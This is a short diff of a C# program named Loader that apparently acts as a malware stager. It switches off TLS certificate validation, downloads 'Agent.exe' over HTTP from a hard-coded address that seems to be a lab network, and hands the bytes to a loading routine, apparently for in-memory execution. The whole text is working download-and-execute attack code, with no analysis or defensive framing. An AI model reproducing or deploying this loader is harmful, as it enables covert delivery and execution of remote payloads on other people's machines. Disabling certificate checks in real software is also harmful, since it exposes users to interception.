@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
@@ -24,7 +25,12 @@ namespace Loader
         {
             if (!HelloTest()) { return; }
             ServicePointManager.ServerCertificateValidationCallback = (a, b, c, d) => true;
-            var data = DownloadAttemptOne("http://192.168.56.102:9000/Agent.exe");
+            var request = (HttpWebRequest)WebRequest.Create("http://192.168.56.102:9000/Agent.exe");
+            var resp = request.GetResponse();
+            MemoryStream ms = new MemoryStream();
+            resp.GetResponseStream().CopyTo(ms);
+            byte[] data = ms.ToArray();
+
             if (data == null) { return; }
             if (!LoadAttemptOne(data)) { return; }
         }
